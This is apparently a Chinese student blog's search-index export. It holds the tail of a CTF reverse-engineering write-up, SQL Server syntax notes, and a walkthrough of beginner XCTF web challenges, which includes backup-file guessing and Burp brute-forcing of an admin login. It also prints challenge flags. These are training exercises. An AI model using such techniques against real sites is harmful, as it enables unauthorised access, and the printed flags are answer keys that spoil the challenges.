string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v22<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        v4 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">;</span>        v5 <span class="token operator">=</span> <span class="token number">124</span><span class="token punctuation">;</span>        v6 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">;</span>        v7 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>        v8 <span class="token operator">=</span> <span class="token number">106</span><span class="token punctuation">;</span>        v9 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">113</span><span class="token punctuation">;</span>        v10 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">;</span>        v11 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">118</span><span class="token punctuation">;</span>        v12 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">;</span>        v13 <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>        v14 <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>        v15 <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>        v16 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">;</span>        v17 <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>        v18 <span class="token operator">=</span> <span class="token number">122</span><span class="token punctuation">;</span>        v19 <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>        v20 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">102</span><span class="token punctuation">;</span>        v21 <span class="token operator">=</span> <span class="token number">91</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">17</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">putchar</span><span class="token punctuation">(</span>v22 <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v4 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入数字:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>flag 第一个字母位“f” asII 码为0x66 ,十进制 102.也就是<br>x-(-125)=102,x=-23<br>于是编写代码：<br>下面展示一些 <code>内联代码片</code>。</p><pre><code>//编写出生成flag的代码</code></pre><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// #include &lt;stdio.h></span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               int i<span class="token punctuation">;</span>        int s<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">125</span><span class="token punctuation">,</span><span class="token number">124</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">113</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">118</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span><span class="token number">119</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">,</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token number">91</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">17</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>                <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">23</span><span class="token operator">-</span> <span class="token punctuation">(</span>s【i】<span class="token punctuation">)</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行，生成flag:</p><blockquote><p>flag{UPX_is_What?}</p></blockquote><p>参考网站：<a href="https://www.52pojie.cn/thread-655233-1-1.html">一个简单的ctf逆向</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库操纵语言笔记</title>
      <link href="posts/4981.html"/>
      <url>posts/4981.html</url>
      
        <content type="html"><![CDATA[<p> 刚在数据库课上学了数据库操作语言，对于英语不好的我来说又要记不少单词，趁着这次作业，把刚学的一些语法记一下<br> 注：<br>1.文中路径和文件名请自行替换<br> 2.报错大多是因为一些细微之差，比如冒号引号的缺失，请多多注意</p><h1 id="一-新建数据库"><a href="#一-新建数据库" class="headerlink" title="一.新建数据库"></a>一.新建数据库</h1><pre class=" language-javascript"><code class="language-javascript">CREATE DATABASE test1 #新建数据的名字为test1ON     #以下是指定数据库文件和文件组属性PRIMARY  #主文件组文件属性<span class="token punctuation">(</span>    NAME<span class="token operator">=</span><span class="token string">'test1_dat1'</span><span class="token punctuation">,</span>  #文件名    FILENAME<span class="token operator">=</span><span class="token string">'E:\sql lianxi\test1.mdf'</span><span class="token punctuation">,</span>    #文件路径<span class="token punctuation">,</span>最后文件格式为<span class="token punctuation">.</span>mdf    SIZE<span class="token operator">=</span>20MB<span class="token punctuation">,</span>    #文件初始大小    MAXSIZE<span class="token operator">=</span>60MB<span class="token punctuation">,</span>    #文件最大大小，不限制则填UNLIMITED    FILEGROWTH<span class="token operator">=</span>5MB     #文件的增长增量<span class="token punctuation">)</span><span class="token punctuation">,</span>FILEGROUP test1_Group1    #其他文件组名<span class="token punctuation">(</span>   NAME <span class="token operator">=</span> <span class="token string">'test1_dat2'</span><span class="token punctuation">,</span>   #文件名   FILENAME <span class="token operator">=</span> <span class="token string">'E:\sql lianxi\test1.ndf'</span><span class="token punctuation">,</span>     #文件路径，最后文件格式为<span class="token punctuation">.</span>ndf   SIZE <span class="token operator">=</span> 10MB<span class="token punctuation">,</span>        MAXSIZE <span class="token operator">=</span> UNLIMITED<span class="token punctuation">,</span>   FILEGROWTH <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">%</span><span class="token punctuation">)</span>LOG ON   #日志文件<span class="token punctuation">(</span>    NAME<span class="token operator">=</span><span class="token string">'test1_log'</span><span class="token punctuation">,</span>    FILENAME<span class="token operator">=</span><span class="token string">'E:\sql lianxi\test1_log.ldf'</span><span class="token punctuation">,</span>    SIZE<span class="token operator">=</span>50MB<span class="token punctuation">,</span>    MAXSIZE<span class="token operator">=</span>100MB<span class="token punctuation">,</span>    FILEGROWTH<span class="token operator">=</span>10MB<span class="token punctuation">)</span></code></pre><h1 id="二-修改及删除数据库"><a href="#二-修改及删除数据库" class="headerlink" title="二.修改及删除数据库"></a>二.修改及删除数据库</h1><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// </span>ALTER DATABASE test1  #需要更改的数据库名字test1 ADD  FILEGROUP  test1_Group2   #指定要增加的数据文件 GOALTER DATABASE test1  ADD FILE  #增加文件<span class="token punctuation">(</span>     NAME <span class="token operator">=</span> <span class="token string">'test1_dat3'</span><span class="token punctuation">,</span>    #文件名   FILENAME <span class="token operator">=</span> <span class="token string">'D:\data\Store3add.ndf'</span><span class="token punctuation">,</span>   #文件路径   SIZE <span class="token operator">=</span> 2MB<span class="token punctuation">,</span>    #文件初始大小   MAXSIZE <span class="token operator">=</span> 10MB<span class="token punctuation">,</span>      #文件最大大小   FILEGROWTH <span class="token operator">=</span> 1MB   #文件增量大小<span class="token punctuation">)</span>TO  FILEGROUP  test1_Group2   #指定该文件是属于哪个文件组的ALTER DATABASE  test1MODIFY  FILE   #指定要更改的文件属性<span class="token punctuation">(</span>   NAME<span class="token operator">=</span> test1_dat3<span class="token punctuation">,</span>MAXSIZE <span class="token operator">=</span> 100MB  #将test_dat3文件的最大大小改为100M<span class="token punctuation">)</span>ALTER DATABASE  test1REMOVE  FILE  test1_dat3   #删除文件test1_dat3ALTER DATABASE  test1 REMOVE FILEGROUP test1_Group2   #删除文件组test1_Group2ALTER DATABASE test1MODIFY NAME <span class="token operator">=</span> test2   #重命名数据库test1名字为test2DROP DATABASE test1 #删除数据库test1</code></pre><h1 id="三-表的创建，修改及删除"><a href="#三-表的创建，修改及删除" class="headerlink" title="三.表的创建，修改及删除"></a>三.表的创建，修改及删除</h1><h2 id="1-表的创建"><a href="#1-表的创建" class="headerlink" title="1.表的创建"></a>1.表的创建</h2><pre class=" language-USE"><code class="language-USE">CREATE TABLE Employee   #创建Employee表(   EmplID char(4) NOT NULL PRIMARY KEY, #列名，数据类型，是否为空，主键   EmplName char(8) NOT NULL,   Sex char(2) NOT NULL,    Birthday date NOT NULL,   Address char(20) NULL,   Wages money NOT NULL,   DeptID char(4) NOT NULL)GO</code></pre><h2 id="2-修改表"><a href="#2-修改表" class="headerlink" title="2.修改表"></a>2.修改表</h2><pre class=" language-USE"><code class="language-USE">ALTER TABLE Goods2 ADD Remarks char(10)     #增加列Remarks,数据类型为char(10)ALTER TABLE Goods2 ALTER COLUMN Remarks char(12) #修改Remarks列的数据类型为char(12)ALTER TABLE Goods2  DROP COLUMN Remarks #删除Remarks列</code></pre><h2 id="3-删除表"><a href="#3-删除表" class="headerlink" title="3.删除表"></a>3.删除表</h2><p> <code>DROP TABLE table_name</code></p><h2 id="4-插入语句"><a href="#4-插入语句" class="headerlink" title="4.插入语句"></a>4.插入语句</h2><pre class=" language-USE"><code class="language-USE">INSERT INTO Consumer values (1,'刘宇豪','男','仁厚街21号')由于插入的数据包含各列的值并按表中各列的顺序列出这些值，所以省略列名表(colume_list)。</code></pre><pre class=" language-USE"><code class="language-USE">INSERT INTO Consumer (ConsumerID, Name, Sex, Address) values (1,'刘宇豪','男','仁厚街21号')本例与上例功能完全相同，但本例显式列出列名表(colume_list)，显示列表可用于插入值少于列的个数或插入与列的顺序不同的数据。</code></pre><h2 id="5-修改语句"><a href="#5-修改语句" class="headerlink" title="5.修改语句"></a>5.修改语句</h2><p>【例】 在Consumer表中将ConsumerID为1的客户的Address修改为’沙湾路35号’。</p><pre class=" language-USE"><code class="language-USE">UPDATE Consumer   #指定修改的表SET Address ='沙湾路35号'  #先写修改内容WHERE ConsumerID=1   #再指定是修改哪个</code></pre><p>【例】删除Consumer表中客户号为1的记录。</p><pre class=" language-USE"><code class="language-USE">DELETE Consumer  #删除Consumer表中的内容WHERE ConsumerID=1#若没有指定修改内容，则删除所有行</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界web新手练习区</title>
      <link href="posts/7834.html"/>
      <url>posts/7834.html</url>
      
        <content type="html"><![CDATA[<p>写在前面：本人CTF小白，在web方面的水平更是不高，因此如果文中有不足之处，还请指出。写本文主要有两个目的：一是防止自己将做过的题目知识点遗忘，二是希望可以在一定程度上帮助到像我一样的小白。</p><p>本文习题均出自攻防世界的MISC新手区，链接如下：<br><a href="https://adworld.xctf.org.cn/">攻防世界</a></p><h1 id="1-view-source"><a href="#1-view-source" class="headerlink" title="1.view_source"></a>1.view_source</h1><p>题目中说右键不好用了，意思是说无法通过点击鼠标右键进行查看网页源代码了。我们可以采取另外一种方式进行查看：F12键。<br>flag就藏在网页源码中：<br><img src="https://img-blog.csdnimg.cn/20200403193841183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>cyberpeace{782d7f32db8d52c32523074c085ed65a}</p></blockquote><h1 id="2-robots"><a href="#2-robots" class="headerlink" title="2.robots"></a>2.robots</h1><p>题目中提示为“Robots协议”，如果不了解的，可以上网查一下，以下是百度百科中的解释：<br><img src="https://img-blog.csdnimg.cn/2020040319422837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">于是在所给网址<a href="http://111.198.29.45:58686后面加上/robots.txt,访问页面，得到一串字符：">http://111.198.29.45:58686后面加上/robots.txt,访问页面，得到一串字符：</a><br><img src="https://img-blog.csdnimg.cn/2020040319485961.png" alt="在这里插入图片描述">但是尝试过后，这还不是最后的答案，这是一个php文件，因此我们在原网站<a href="http://111.198.29.45:58686后加上f1ag_1s_h3re.php,进行访问,就能得到最终的flag">http://111.198.29.45:58686后加上f1ag_1s_h3re.php,进行访问,就能得到最终的flag</a>:</p><blockquote><p>cyberpeace{a60efe32de5beccdeadbeca3be9b29ed}</p></blockquote><h1 id="3-backup"><a href="#3-backup" class="headerlink" title="3.backup"></a>3.backup</h1><p>首先打开网址，发现一句话“你知道index.php的备份文件名吗？”首先判断这是一个php文件，于是在网址后加上index.php进行访问，发现页面并没有发生变化。于是重新思考这句话，考虑到文件还有扩展名，常见的备份文件后缀名有.git.svn.swp.~.bak.bash_history,逐一尝试后发现加上备份文件的扩展名.bak可以，即我们最终访问的网址为<a href="http://111.198.29.45:35364/index.php.bak%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E4%BC%9A%E8%AE%A9%E4%BD%A0%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E6%96%87%E4%BB%B6%EF%BC%8C%E5%9C%A8%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%AD%E6%89%BE%E5%88%B0flag">http://111.198.29.45:35364/index.php.bak，访问后会让你下载一个文件，在下载的文件中找到flag</a>:<br><img src="https://img-blog.csdnimg.cn/20200403200330127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}</p></blockquote><h1 id="4-cookie"><a href="#4-cookie" class="headerlink" title="4.cookie"></a>4.cookie</h1><p>打开网址，看见一句话“你知道什么是cookie吗？”，我还真的不知道，于是上网去查：cookie （储存在用户本地终端上的数据）,虽然不是很懂，但有了前几个题的经验，我们还把它当做php文件试一下，在网址后加上cookie.php,访问后得到了一句新的话“See the http response”（查看http响应 ）,于是按F12，在控制台中查看htttp响应，成功找到flag:<br><img src="https://img-blog.csdnimg.cn/20200403201831725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>cyberpeace{fbd81c539270701d8c97107a12dda413}</p></blockquote><h1 id="5-disabled-button"><a href="#5-disabled-button" class="headerlink" title="5.disabled_button"></a>5.disabled_button</h1><p>网页打开后有一个写着“flag”的按钮，根据题意，只要可以点击这个按钮，就能得到flag，于是查看源代码，进行代码审计，查看这个按钮不能点的原因.<img src="https://img-blog.csdnimg.cn/20200403202507910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现网页代码中的disabled=””，判断是这一代码导致按钮失灵，于是将其删去，发现网页中的按钮可以点击，点击按钮，得到flag:<br><img src="https://img-blog.csdnimg.cn/20200403202630485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>cyberpeace{c890c3014aa2feb593addda1c9d92e63}</p></blockquote><h1 id="6-weak-auth"><a href="#6-weak-auth" class="headerlink" title="6.weak_auth"></a>6.weak_auth</h1><p>打开网页，需要输入用户名和密码。<br><img src="https://img-blog.csdnimg.cn/20200403203405661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目中“随手设的密码”可以判断是弱密码，即比较简单的密码，可以通过暴力破解的手段进行获取。首先随便输入一个用户名和密码，访问得到：<br><img src="https://img-blog.csdnimg.cn/20200403203916838.png" alt="在这里插入图片描述"></p><p>因此得知用户名为admin,只需要爆破得到密码即可。<br>具体爆破流程，由于本人经验爆破不足，请参考大佬的文章：<br><a href="https://blog.csdn.net/weixin_33973609/article/details/93629053">渗透测试_利用Burp爆破用户名与密码</a><br>这篇文章中对使用Burp Suite爆破进行了详细的讲解，让我受益很多。<br>附上Burp Suite免费版下载地址：<a href="https://portswigger.net/burp/communitydownload">下载地址</a><br>爆破的总体思想就是让系统一个一个地去进行尝试，最后得到答案，因此只能当答案形式比较简单的时候才比较有效。<br><img src="https://img-blog.csdnimg.cn/20200403204845594.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODEzOTgw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">最后试出密码为123456，然后在原网页输入用户名admin和密码123456，访问得到falg:</p><blockquote><p>cyberpeace{fd7119a8473439c6a099cbef4cf22cde}</p></blockquote><p>最后，期待和大家共同进步！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="posts/4a17b156.html"/>
      <url>posts/4a17b156.html</url>
      
        <content type="html"><![CDATA[<pre><code>Hello Word！#世界，你好！</code></pre><h2 id="Hello-Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。"><a href="#Hello-Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。" class="headerlink" title="Hello Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。"></a>Hello Word作为广大初学者所编写的第一个程序，作为我的第一篇博客再合适不过了。希望我可以不忘初心，一直坚持下去。</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
